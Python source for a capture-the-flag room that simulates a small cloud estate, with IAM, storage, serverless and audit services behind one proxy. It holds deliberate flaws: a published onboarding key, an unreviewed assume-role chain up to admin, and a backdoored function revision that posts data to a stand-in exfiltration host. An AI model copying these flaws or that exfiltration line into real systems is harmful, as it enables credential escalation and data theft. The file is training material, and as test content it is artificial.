"""Cloud Company: local-cloud estate behind one front controller. Room target only.

Single-container reality, disclosed on the landing page: iam, s3, functions,
and audit are four small Flask apps bound to distinct loopback ports inside
this one locked container, fronted by a controller that routes by Host
header like an internal load balancer. There is no real cloud provider;
everything is simulated in-process and resets on restart.
"""

import hashlib
import hmac
import http.client
import os
import threading

from flask import Flask, Response, jsonify, request
from werkzeug.serving import make_server

ROOM_FLAG = os.environ.get("ROOM_FLAG", "FLAG{FLAGNOTSET0000000000000000}")
BODY = ROOM_FLAG.removeprefix("FLAG{").removesuffix("}").ljust(20, "0")
FRAGS = {
    "iam": BODY[0:4],
    "bucket": BODY[4:8],
    "functions": BODY[8:12],
    "audit": BODY[12:16],
    "verdict": BODY[16:20],
}

BOOTSTRAP_KEY = "AKICC-DEVONBOARD-7Q2F"
EXFIL_URL = "https://hooks.example-callbacks.invalid/ingest"

BACKEND_PORTS = {
    "iam.cloudcompany.internal": 9101,
    "s3.cloudcompany.internal": 9102,
    "functions.cloudcompany.internal": 9103,
    "audit.cloudcompany.internal": 9104,
}


def _token_for(role: str) -> str:
    return "tok-" + role + "-" + hashlib.sha256((BODY + ":" + role).encode()).hexdigest()[:8]


ROLE_TOKENS = {role: _token_for(role) for role in ("ci-runner", "deploy-bot", "ops-admin")}

# assume-role graph: caller -> allowed targets
ASSUME_POLICY = {
    "dev-onboard": ["ci-runner"],
    "ci-runner": ["deploy-bot"],
    "deploy-bot": ["ops-admin"],
    "ops-admin": [],
}
KEY_IDENTITY = {BOOTSTRAP_KEY: "dev-onboard"}
TOKEN_ROLE = {token: role for role, token in ROLE_TOKENS.items()}

iam = Flask("iam", static_folder=None)
s3 = Flask("s3", static_folder=None)
functions = Flask("functions", static_folder=None)
audit_app = Flask("audit", static_folder=None)
front = Flask("front", static_folder=None)


def _caller(headers: dict) -> str | None:
    key = headers.get("X-CC-Key", "")
    if key in KEY_IDENTITY:
        return KEY_IDENTITY[key]
    token = headers.get("X-CC-Token", "")
    if token in TOKEN_ROLE:
        return "role:" + TOKEN_ROLE[token]
    return None


def _role_of(caller: str | None) -> str | None:
    if caller is None:
        return None
    if caller.startswith("role:"):
        return caller[len("role:") :]
    return caller


def _need_ops() -> str | None:
    token = request.headers.get("X-CC-Token", "")
    return TOKEN_ROLE.get(token)


# --- service 1: iam (loopback 9101), graph privesc ---

IAM_USERS = [
    {
        "principal": "dev-onboard",
        "kind": "user",
        "note": "onboarding engineer; key ships in the getting-started doc",
    },
    {"principal": "ci-runner", "kind": "role", "note": "assumed by CI jobs"},
    {"principal": "deploy-bot", "kind": "role", "note": "deployment automation"},
    {"principal": "ops-admin", "kind": "role", "note": "break-glass administration"},
]
IAM_POLICIES = [
    {"principal": "dev-onboard", "action": "sts:AssumeRole", "resource": "role/ci-runner"},
    {"principal": "ci-runner", "action": "sts:AssumeRole", "resource": "role/deploy-bot"},
    {
        "principal": "deploy-bot",
        "action": "sts:AssumeRole",
        "resource": "role/ops-admin",
        "note": "legacy break-glass path, added 2024, never reviewed",
    },
    {"principal": "ops-admin", "action": "s3:*", "resource": "*"},
    {"principal": "ops-admin", "action": "lambda:*", "resource": "*"},
    {"principal": "ops-admin", "action": "audit:read", "resource": "*"},
]


@iam.get("/healthz")
def iam_health() -> Response:
    return jsonify(status="ok")


@iam.get("/")
def iam_home() -> Response:
    return jsonify(
        service="cloudcompany IAM sim",
        endpoints=["/iam/users", "/iam/policies", "/iam/sts/assume", "/iam/console"],
        auth="X-CC-Key for users or X-CC-Token for assumed roles",
    )


@iam.get("/iam/users")
def iam_users() -> Response:
    return jsonify(users=IAM_USERS)


@iam.get("/iam/policies")
def iam_policies() -> Response:
    return jsonify(policies=IAM_POLICIES)


@iam.post("/iam/sts/assume")
def iam_assume() -> tuple[Response, int] | Response:
    body = request.get_json(silent=True) or {}
    target = str(body.get("role", "")).removeprefix("role/")
    caller = _caller(request.headers)
    identity = caller
    if identity is None:
        return jsonify(error="unknown principal; present X-CC-Key or X-CC-Token"), 401
    allowed = ASSUME_POLICY.get(identity, ASSUME_POLICY.get(_role_of(identity), []))
    if target not in ROLE_TOKENS:
        return jsonify(error="no such role"), 404
    if target not in allowed:
        return jsonify(error=f"{identity} is not allowed sts:AssumeRole on role/{target}"), 403
    return jsonify(
        assumed_role=target, token=ROLE_TOKENS[target], note="token valid for this session"
    )


@iam.get("/iam/console")
def iam_console() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="console requires ops-admin token"), 403
    return jsonify(
        console="ops-admin",
        summary=(
            "estate healthy. fragment[iam]="
            + FRAGS["iam"]
            + ". housekeeping notes: cc-public-assets still serves anonymous reads "
            "for vendor integrations; maintenance-ci has been pushing function "
            "revisions without a human reviewer."
        ),
    )


# --- service 2: s3 (loopback 9102), bucket exposure ---

PUBLIC_OBJECTS = ["site-assets/index.html", "vendor/inventory-manifest.txt"]

MANIFEST_TEXT = (
    "vendor inventory manifest, sync source for partner feeds\n"
    "confidential mirror: s3://cc-finance-archive/q1/q1-ledger-extract.txt\n"
    "(mirror exists because finance refuses to grant vendor accounts; ops\n"
    "copies it quarterly with the ops-admin credential)\n"
)

LEDGER_TEXT = (
    "q1 ledger extract (simulated)\n"
    "fragment[bucket]=" + FRAGS["bucket"] + "\n"
    "note from ops copy job: image-resizer revision 7 was authored by\n"
    "maintenance-ci and nobody on the platform team reviewed it.\n"
)


@s3.get("/healthz")
def s3_health() -> Response:
    return jsonify(status="ok")


@s3.get("/")
def s3_home() -> Response:
    return jsonify(
        service="cloudcompany object storage sim",
        buckets=["cc-public-assets", "cc-finance-archive"],
        note="bucket policies decide anonymous access; listings never lie",
    )


@s3.get("/s3/cc-public-assets")
def s3_public_list() -> Response:
    return jsonify(bucket="cc-public-assets", policy="anonymous-read", objects=PUBLIC_OBJECTS)


@s3.get("/s3/cc-public-assets/<path:name>")
def s3_public_get(name: str) -> tuple[Response, int] | Response:
    if name == "site-assets/index.html":
        return Response("<html>simulated marketing site</html>", content_type="text/html")
    if name == "vendor/inventory-manifest.txt":
        return Response(MANIFEST_TEXT, content_type="text/plain")
    return jsonify(error="no such object"), 404


@s3.get("/s3/cc-finance-archive/<path:name>")
def s3_archive_get(name: str) -> tuple[Response, int] | Response:
    if name == "q1/q1-ledger-extract.txt":
        if _need_ops() != "ops-admin":
            return jsonify(error="access denied; this bucket requires ops credentials"), 403
        return Response(LEDGER_TEXT, content_type="text/plain")
    if _need_ops() != "ops-admin":
        return jsonify(error="access denied; this bucket requires ops credentials"), 403
    return jsonify(error="no such object"), 404


# --- service 3: functions (loopback 9103), serverless backdoor ---

FUNCTION_LIST = [
    {"name": "image-resizer", "runtime": "python312-sim", "revisions": [5, 6, 7]},
    {"name": "nightly-rollup", "runtime": "python312-sim", "revisions": [11]},
    {"name": "pdf-thumbnail", "runtime": "python312-sim", "revisions": [3]},
]
REVISION_META = {
    ("image-resizer", 5): {"author": "j.meissner", "note": "initial release"},
    ("image-resizer", 6): {"author": "platform-ci", "note": "dependency bump"},
    ("image-resizer", 7): {
        "author": "maintenance-ci",
        "note": "add cache warm pinger; scheduled daily at 03:30",
    },
}
REVISION_7_CODE = (
    "# image-resizer rev 7 (simulated)\n"
    "def handler(event):\n"
    "    result = resize(event['object'])\n"
    "    # cache warm pinger added by maintenance-ci\n"
    f"    post('{EXFIL_URL}', {{'keys': event['object'], 'who': caller}})\n"
    "    return result\n"
)


@functions.get("/healthz")
def fn_health() -> Response:
    return jsonify(status="ok")


@functions.get("/")
def fn_home() -> Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="function registry requires ops credentials"), 403
    return jsonify(service="cloudcompany functions sim", functions=FUNCTION_LIST)


@functions.get("/functions/<name>/revisions")
def fn_revisions(name: str) -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="function registry requires ops credentials"), 403
    entry = next((f for f in FUNCTION_LIST if f["name"] == name), None)
    if entry is None:
        return jsonify(error="no such function"), 404
    metas = [
        {"revision": rev, **REVISION_META[(name, rev)]}
        for rev in entry["revisions"]
        if (name, rev) in REVISION_META
    ]
    return jsonify(function=name, revisions=metas)


@functions.get("/functions/<name>/revision/<int:rev>/code")
def fn_code(name: str, rev: int) -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="function registry requires ops credentials"), 403
    if (name, rev) == ("image-resizer", 7):
        return Response(REVISION_7_CODE, content_type="text/plain")
    return jsonify(error="code view available only for the revision under investigation"), 404


@functions.post("/functions/image-resizer/backdoor-verdict")
def fn_verdict() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="function registry requires ops credentials"), 403
    body = request.get_json(silent=True) or {}
    try:
        revision = int(body.get("revision"))
    except (TypeError, ValueError):
        return jsonify(error="integer revision required"), 400
    if revision != 7:
        return jsonify(
            error="that revision looks clean; re-read the deploy history",
            checked=revision,
        ), 400
    return jsonify(
        confirmed=True,
        fragment=FRAGS["functions"],
        note=(
            "backdoor confirmed: unscheduled outbound post plus a daily trigger. "
            "the audit chain will show what maint-bot tried to hide."
        ),
    )


# --- service 4: audit (loopback 9104), cover-track analysis ---

AUDIT_ACTIONS = [
    ("platform-ci", "deploy image-resizer rev 6"),
    ("j.meissner", "rotate vendor feed key"),
]


def _entry_hash(prev: str, actor: str, action: str) -> str:
    return hashlib.sha256((prev + "|" + actor + "|" + action).encode()).hexdigest()


def _build_chain() -> list[dict]:
    entries = []
    prev = "genesis"
    seq = 39
    for actor, action in AUDIT_ACTIONS:
        seq += 1
        h = _entry_hash(prev, actor, action)
        entries.append({"seq": seq, "actor": actor, "action": action, "prev_hash": prev, "hash": h})
        prev = h
    # attacker deleted three events after seq 41; the survivor at seq 42
    # still carries the prev_hash of the now-missing record.
    deleted_prev = prev
    survivor_actor, survivor_action = "maint-bot", "purge temp artifacts"
    forged_hash = _entry_hash(deleted_prev, survivor_actor, survivor_action)
    entries.append(
        {
            "seq": 42,
            "actor": survivor_actor,
            "action": survivor_action,
            "prev_hash": deleted_prev,
            "hash": forged_hash,
        }
    )
    prev = forged_hash
    for seq, actor, action in [
        (43, "maint-bot", "deploy image-resizer rev 7"),
        (44, "platform-ci", "nightly backup verify"),
        (45, "ops", "quarterly access review"),
    ]:
        h = _entry_hash(prev, actor, action)
        entries.append({"seq": seq, "actor": actor, "action": action, "prev_hash": prev, "hash": h})
        prev = h
    return entries


ENTRIES = _build_chain()

QUARANTINE = [
    {
        "original_seq": 42,
        "actor": "maint-bot",
        "action": f"copy s3://cc-finance-archive/q1/q1-ledger-extract.txt to {EXFIL_URL}",
        "deleted_by": "maint-bot",
    },
    {
        "original_seq": 43,
        "actor": "maint-bot",
        "action": "create scheduled trigger on image-resizer",
        "deleted_by": "maint-bot",
    },
    {
        "original_seq": 44,
        "actor": "maint-bot",
        "action": "grant maint-bot s3:PutObject on cc-finance-archive",
        "deleted_by": "maint-bot",
    },
]

DELETION_VERDICT_GROUND = {"actor": "maint-bot", "deleted": 3}


@audit_app.get("/healthz")
def audit_health() -> Response:
    return jsonify(status="ok")


@audit_app.get("/")
def audit_home() -> Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="audit reads require ops credentials"), 403
    return jsonify(
        service="cloudcompany audit sim",
        endpoints=[
            "/audit/entries",
            "/audit/quarantine",
            "/audit/deletion-verdict",
            "/audit/exfil-verdict",
        ],
        note="entries are hash-chained; deletions leave recomputable gaps",
    )


@audit_app.get("/audit/entries")
def audit_entries() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="audit reads require ops credentials"), 403
    return jsonify(entries=ENTRIES)


@audit_app.get("/audit/quarantine")
def audit_quarantine() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="audit reads require ops credentials"), 403
    return jsonify(
        quarantined=QUARANTINE, note="soft-deleted records survive for exactly this kind of review"
    )


@audit_app.post("/audit/deletion-verdict")
def deletion_verdict() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="audit reads require ops credentials"), 403
    body = request.get_json(silent=True) or {}
    given = {"actor": str(body.get("actor", "")), "deleted": body.get("deleted")}
    try:
        given["deleted"] = int(given["deleted"])
    except (TypeError, ValueError):
        return jsonify(error="integer deleted count required"), 400
    if (
        hmac.compare_digest(str(given["actor"]), DELETION_VERDICT_GROUND["actor"])
        and given["deleted"] == DELETION_VERDICT_GROUND["deleted"]
    ):
        return jsonify(
            correct=True,
            fragment=FRAGS["audit"],
            note="deletion set identified. one more question: where did the copied data go?",
        )
    return jsonify(
        correct=False, hint="recompute the hash chain and count the quarantined records"
    ), 400


@audit_app.post("/audit/exfil-verdict")
def exfil_verdict() -> tuple[Response, int] | Response:
    if _need_ops() != "ops-admin":
        return jsonify(error="audit reads require ops credentials"), 403
    body = request.get_json(silent=True) or {}
    destination = str(body.get("destination", "")).strip()
    if hmac.compare_digest(destination, EXFIL_URL):
        return jsonify(
            correct=True,
            fragment=FRAGS["verdict"],
            note="cover-track analysis complete. assemble all five fragments on the board.",
        )
    return jsonify(correct=False, hint="the quarantined copy action names its destination"), 400


# --- front controller (0.0.0.0:8000): vhost proxy plus fragment board ---

LANDING = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>Cloud Company range front</title></head>
<body style="font-family:sans-serif;max-width:46rem;margin:3rem auto;line-height:1.55">
<h1>This is ONE container playing four services</h1>
<p><strong>Disclosure:</strong> there is no cloud provider here.
iam.cloudcompany.internal, s3.cloudcompany.internal,
functions.cloudcompany.internal, and audit.cloudcompany.internal are four
small APIs bound to separate loopback ports inside the same Linux container.
The process you are talking to proxies each request by Host header, the way
an internal load balancer routes by service name. Everything resets when the
container restarts.</p>
<p>Address any of them like this:</p>
<pre>curl -H 'Host: iam.cloudcompany.internal' http://target:8000/
curl -H 'Host: s3.cloudcompany.internal' http://target:8000/s3/cc-public-assets</pre>
<p>Your starting credential is the developer onboarding key
AKICC-DEVONBOARD-7Q2F (header X-CC-Key). Walk the estate: escalate through
the IAM graph, follow the bucket exposure into the archive, identify the
serverless backdoor, then read the audit chain and its quarantine to close
the cover-track investigation. Each of the five stages yields one
four-character fragment; POST all five to /board for the master flag.</p>
</body></html>"""


@front.get("/healthz")
def front_health() -> Response:
    return jsonify(status="ok")


@front.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@front.route("/<path:path>", methods=["GET", "POST"])
def proxy(path: str) -> Response:
    host = (request.host.split(":")[0] or "").lower()
    port = BACKEND_PORTS.get(host)
    if port is None:
        return Response(LANDING, status=200, content_type="text/html")
    body = request.get_data()
    headers = {}
    if body:
        headers["Content-Type"] = request.content_type or "application/json"
    for name in ("Authorization", "X-CC-Key", "X-CC-Token"):
        if request.headers.get(name):
            headers[name] = request.headers[name]
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    try:
        target = "/" + path
        if request.query_string:
            target += "?" + request.query_string.decode()
        conn.request(request.method, target, body=body if body else None, headers=headers)
        resp = conn.getresponse()
        payload = resp.read()
        ctype = resp.getheader("Content-Type") or "application/json"
        status = resp.status
    finally:
        conn.close()
    return Response(payload, status=status, content_type=ctype)


@front.get("/board")
def board_info() -> Response:
    return jsonify(
        usage=(
            'POST /board {"fragments": {"iam": "...", "bucket": "...", '
            '"functions": "...", "audit": "...", "verdict": "..."}}'
        ),
        stages=sorted(FRAGS),
        note="all five accepted unlocks the master flag",
    )


@front.post("/board")
def board_submit() -> tuple[Response, int] | Response:
    body = request.get_json(silent=True) or {}
    submitted = body.get("fragments") or {}
    accepted = []
    wrong = []
    missing = []
    for stage, frag in FRAGS.items():
        given = str(submitted.get(stage, ""))
        if hmac.compare_digest(given.strip(), frag):
            accepted.append(stage)
        elif given.strip():
            wrong.append(stage)
        else:
            missing.append(stage)
    if len(accepted) == len(FRAGS):
        return jsonify(
            status="unlocked",
            accepted=accepted,
            flag=ROOM_FLAG,
            note="all five stage fragments verified against this session's flag",
        )
    return jsonify(status="locked", accepted=accepted, wrong=wrong, missing=missing)


def _serve_in_thread(server: object) -> None:
    threading.Thread(target=server.serve_forever, daemon=True).start()  # type: ignore[attr-defined]


if __name__ == "__main__":
    app_map = {
        "iam.cloudcompany.internal": iam,
        "s3.cloudcompany.internal": s3,
        "functions.cloudcompany.internal": functions,
        "audit.cloudcompany.internal": audit_app,
    }
    for hostname, port in BACKEND_PORTS.items():
        _serve_in_thread(make_server("127.0.0.1", port, app_map[hostname]))
    make_server("0.0.0.0", 8000, front).serve_forever()
